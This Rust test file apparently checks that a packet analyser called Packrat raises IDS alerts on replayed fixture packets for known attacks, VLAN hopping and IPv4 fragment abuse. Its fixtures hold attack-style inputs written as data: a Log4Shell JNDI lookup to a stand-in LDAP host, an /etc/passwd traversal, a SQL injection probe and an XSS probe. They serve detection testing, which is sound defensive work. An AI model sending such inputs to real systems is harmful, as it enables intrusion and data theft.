//! Replay fixtures for Packrat's shipped passive IDS signatures.

use packrat_tui::net::packet::Packet;
use packrat_tui::analysis::vlan::{AlertSeverity, VlanIntel};
use packrat_tui::net::security::SecurityEngine;
use rstest::rstest;

fn packet(protocol: &str, destination_port: u16, info: &str, bytes: Vec<u8>) -> Packet {
    Packet {
        no: 1,
        timestamp: 1.0,
        src: "203.0.113.9".into(),
        dst: "10.0.0.5".into(),
        protocol: protocol.into(),
        length: bytes.len() as u16,
        info: info.into(),
        src_port: Some(50000),
        dst_port: Some(destination_port),
        vlan_id: None,
        vlan_pcp: None,
        vlan_dei: None,
        outer_vlan_id: None,
        bytes,
    }
}

fn fixture(name: &str) -> Packet {
    match name {
        "EternalBlue" => packet("SMB", 445, "", b"prefixSMBrsuffix".to_vec()),
        "BlueKeep (CVE-2019-0708)" => {
            let mut bytes = vec![0_u8; 120];
            bytes[..3].copy_from_slice(&[0x03, 0x00, 0x00]);
            packet("RDP", 3389, "", bytes)
        }
        "Log4Shell (CVE-2021-44228)" => packet("HTTP", 8080, "", b"${jndi:ldap://example.test/x}".to_vec()),
        "Shellcode NOP sled" => packet("TCP", 4444, "", vec![0x90; 20]),
        "LLMNR Poisoning" => packet("UDP", 5355, "", vec![0; 20]),
        "NBNS WPAD Poisoning" => packet("NBNS", 137, "", vec![0x00, 0x20, 0x43, 0x4b]),
        "Directory Traversal" => packet("HTTP", 80, "", b"../../../../../../etc/passwd".to_vec()),
        "SQL Injection Probe" => packet("HTTP", 80, "", b"UNION SELECT password FROM users".to_vec()),
        "XSS Probe" => packet("HTTP", 80, "", b"<script>alert(1)</script>".to_vec()),
        "Heartbleed (CVE-2014-0160)" => packet("TLS", 443, "", vec![0x18, 0x03, 0x02, 0xff, 0xff, 0x01, 0x00]),
        "PrintNightmare (CVE-2021-1675)" => packet("SMB", 445, "", b"\x1c\x00SpoolSS".to_vec()),
        "Pass-the-Hash (suspected)" => packet("SMB", 445, "", b"NTLMSSP authentication".to_vec()),
        "Log4Shell via DNS (CVE-2021-44228)" => packet("DNS", 53, "query jndi callback", vec![0; 20]),
        _ => panic!("unknown fixture {name}"),
    }
}

#[rstest]
#[case("EternalBlue")]
#[case("BlueKeep (CVE-2019-0708)")]
#[case("Log4Shell (CVE-2021-44228)")]
#[case("Shellcode NOP sled")]
#[case("LLMNR Poisoning")]
#[case("NBNS WPAD Poisoning")]
#[case("Directory Traversal")]
#[case("SQL Injection Probe")]
#[case("XSS Probe")]
#[case("Heartbleed (CVE-2014-0160)")]
#[case("PrintNightmare (CVE-2021-1675)")]
#[case("Pass-the-Hash (suspected)")]
#[case("Log4Shell via DNS (CVE-2021-44228)")]
fn shipped_signature_replays(#[case] signature: &str) {
    let mut security = SecurityEngine::default();
    security.update(&fixture(signature));
    assert!(
        security.ids_alerts.iter().any(|alert| alert.signature == signature),
        "fixture did not trigger {signature}; got {:?}",
        security.ids_alerts.iter().map(|alert| alert.signature).collect::<Vec<_>>(),
    );
}

fn ethernet_packet(no: u64, src_mac: [u8; 6], dst_mac: [u8; 6], vlan_id: Option<u16>) -> Packet {
    let mut bytes = Vec::new();
    bytes.extend_from_slice(&dst_mac);
    bytes.extend_from_slice(&src_mac);
    bytes.extend_from_slice(&[0x08, 0x00]);
    Packet {
        no,
        timestamp: no as f64,
        src: "203.0.113.9".into(),
        dst: "10.0.0.5".into(),
        protocol: "TCP".into(),
        length: bytes.len() as u16,
        info: String::new(),
        src_port: Some(50000),
        dst_port: Some(443),
        vlan_id,
        vlan_pcp: None,
        vlan_dei: None,
        outer_vlan_id: None,
        bytes,
    }
}

#[test]
fn vlan_replay_detects_double_tag_native_pcp_and_dtp() {
    let mut intel = VlanIntel::default();

    let mut qinq = ethernet_packet(1, [0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x01], [0, 1, 2, 3, 4, 5], Some(20));
    qinq.outer_vlan_id = Some(100);
    intel.ingest(&qinq);

    let native = ethernet_packet(2, [0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x02], [0, 1, 2, 3, 4, 5], Some(1));
    intel.ingest(&native);

    let mut pcp = ethernet_packet(3, [0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x03], [0, 1, 2, 3, 4, 5], Some(30));
    pcp.vlan_pcp = Some(7);
    intel.ingest(&pcp);

    let dtp = ethernet_packet(
        4,
        [0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x04],
        [0x01, 0x00, 0x0c, 0xcc, 0xcc, 0xcc],
        None,
    );
    intel.ingest(&dtp);

    assert!(intel.alerts.iter().any(|alert| alert.category == "VLAN-Hop" && alert.severity == AlertSeverity::Critical));
    assert!(intel.alerts.iter().any(|alert| alert.category == "Native-VLAN"));
    assert!(intel.alerts.iter().any(|alert| alert.category == "PCP-Abuse"));
    assert!(intel.alerts.iter().any(|alert| alert.category == "DTP" && alert.severity == AlertSeverity::Critical));
}

#[test]
fn vlan_replay_detects_mac_crossing_vlans() {
    let mut intel = VlanIntel::default();
    let mac = [0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x05];
    intel.ingest(&ethernet_packet(1, mac, [0, 1, 2, 3, 4, 5], Some(10)));
    intel.ingest(&ethernet_packet(2, mac, [0, 1, 2, 3, 4, 5], Some(20)));

    assert!(intel.alerts.iter().any(|alert| alert.category == "MAC-VLAN-Cross"));
}

fn ipv4_fragment_packet(
    no: u64,
    identification: u16,
    offset_bytes: u16,
    more_fragments: bool,
    payload: &[u8],
) -> Packet {
    assert_eq!(offset_bytes % 8, 0);
    let mut bytes = vec![0_u8; 14 + 20];
    bytes[12..14].copy_from_slice(&0x0800_u16.to_be_bytes());
    bytes[14] = 0x45;
    bytes[16..18].copy_from_slice(&((20 + payload.len()) as u16).to_be_bytes());
    bytes[18..20].copy_from_slice(&identification.to_be_bytes());
    let fragment_field = (offset_bytes / 8) | if more_fragments { 0x2000 } else { 0 };
    bytes[20..22].copy_from_slice(&fragment_field.to_be_bytes());
    bytes[23] = 17;
    bytes[26..30].copy_from_slice(&[203, 0, 113, 9]);
    bytes[30..34].copy_from_slice(&[10, 0, 0, 5]);
    bytes.extend_from_slice(payload);
    packet("UDP", 53, "", bytes).with_number_and_timestamp(no, no as f64)
}

trait PacketFixtureExt {
    fn with_number_and_timestamp(self, no: u64, timestamp: f64) -> Self;
}

impl PacketFixtureExt for Packet {
    fn with_number_and_timestamp(mut self, no: u64, timestamp: f64) -> Self {
        self.no = no;
        self.timestamp = timestamp;
        self.length = self.bytes.len() as u16;
        self
    }
}

#[test]
fn detects_conflicting_ipv4_fragment_overlap() {
    let mut security = SecurityEngine::default();
    security.update(&ipv4_fragment_packet(1, 0x1234, 0, true, b"abcdefghijklmnop"));
    security.update(&ipv4_fragment_packet(2, 0x1234, 8, false, b"XXXXXXXX"));

    assert!(security.ids_alerts.iter().any(|alert| {
        alert.signature == "Conflicting IPv4 fragments"
            && alert.severity == packrat_tui::net::security::Severity::Critical
    }));
}

#[test]
fn identical_ipv4_fragment_retransmission_is_not_an_overlap_alert() {
    let mut security = SecurityEngine::default();
    let fragment = ipv4_fragment_packet(1, 0x2345, 0, true, b"abcdefgh");
    security.update(&fragment);
    security.update(&fragment.with_number_and_timestamp(2, 2.0));

    assert!(!security.ids_alerts.iter().any(|alert| {
        alert.signature == "Conflicting IPv4 fragments"
    }));
}

#[test]
fn detects_tiny_and_excessive_ipv4_fragments() {
    let mut security = SecurityEngine::default();
    security.update(&ipv4_fragment_packet(1, 0x3456, 0, true, b"tiny"));
    for no in 2..=66 {
        security.update(&ipv4_fragment_packet(no, 0x4567, 0, true, b"12345678"));
    }

    assert!(security.ids_alerts.iter().any(|alert| alert.signature == "Tiny IPv4 fragment"));
    assert!(security.ids_alerts.iter().any(|alert| alert.signature == "IPv4 fragment flood"));
}
